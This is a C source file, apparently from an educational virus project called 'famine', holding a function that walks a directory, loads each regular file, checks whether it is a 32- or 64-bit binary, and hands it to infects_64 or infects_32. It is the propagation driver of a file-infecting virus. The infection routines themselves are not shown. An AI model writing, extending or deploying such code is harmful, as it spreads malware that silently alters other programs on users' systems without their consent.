#include "ft_famine.h"

int file_handler(char *path)
{
    struct dirent   *dir;
    DIR             *tmp = opendir(path);
    int             ret = 0;
    char            *full_path;
    if(tmp)
    {
        while((dir = readdir(tmp)) != NULL)
        {
            if(dir->d_type == DT_REG)
            {
                t_binary *binary = ft_calloc(1, sizeof(t_binary));
                if(!binary)
                    return 1;
                full_path = build_path(path, dir->d_name);
                open_binary_in_memory(full_path, binary);
                if(!binary->buffer)
                {
                    free_binary(binary);
                    free(full_path);
                    full_path = NULL;
                    continue;
                }
                if(!check_file_arch(binary))
                {
                    free_binary(binary);
                    free(full_path);
                    full_path = NULL;
                    continue;
                }
                if(binary->arch == ARCH64)
                    ret = infects_64(binary, full_path);
                else
                    ret = infects_32(binary, full_path);
                free_binary(binary);
                free(full_path);
                full_path = NULL;
            }
        }
        closedir(tmp);
    }
    return ret;
}